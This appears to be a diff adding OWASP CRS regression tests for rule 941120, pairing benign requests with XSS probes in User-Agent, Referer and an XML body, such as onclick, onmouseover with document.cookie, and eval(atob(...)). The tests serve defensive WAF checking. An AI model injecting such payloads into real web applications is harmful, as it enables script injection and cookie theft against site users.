+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://maps.example.com/location?position=center&zoom=10"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-42: Negative test: Valid Referer with session parameter",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://secure.example.com/checkout?session=abc123def456"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-43: Negative test: Valid Referer with common path",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://www.example.com/version/v2.0/documentation"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-44: Negative test: Valid User-Agent with Android version",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-45: Negative test: Valid Referer with addon parameter",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://store.example.com/checkout?addon=premium&option=monthly"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-46: Positive test: Malicious User-Agent with onclick XSS",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (Windows NT 10.0) <img onclick=alert(1)>"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-47: Positive test: Malicious User-Agent with onload XSS",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Test/1.0 (compatible; onload=alert(document.domain))"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-48: Positive test: Malicious User-Agent with onerror XSS",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "CustomBot/2.0 ' onerror=alert(1) '"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-49: Positive test: Malicious Referer with onclick XSS",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://evil.com/page?test=1' onclick=alert(1) '"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-50: Positive test: Malicious Referer with onmouseover XSS",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://evil.com/\" onmouseover=alert(document.cookie) \""
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-51: Positive test: Malicious Referer with onfocus XSS",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://evil.com/search?q=test;onfocus=eval(atob('YWxlcnQoMSk='))"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-52: GHSA: 941120 payload via XML attribute injection (verifies XML://@* coverage)",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Content-Type",
+        "application/xml"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "60"
+      ]
+    ],
+    "body": "<?xml version=\"1.0\"?><root><a probe=\"  onload= \"></a></root>",
+    "expect_ids": [
+      941120
+    ]
+  }
+]
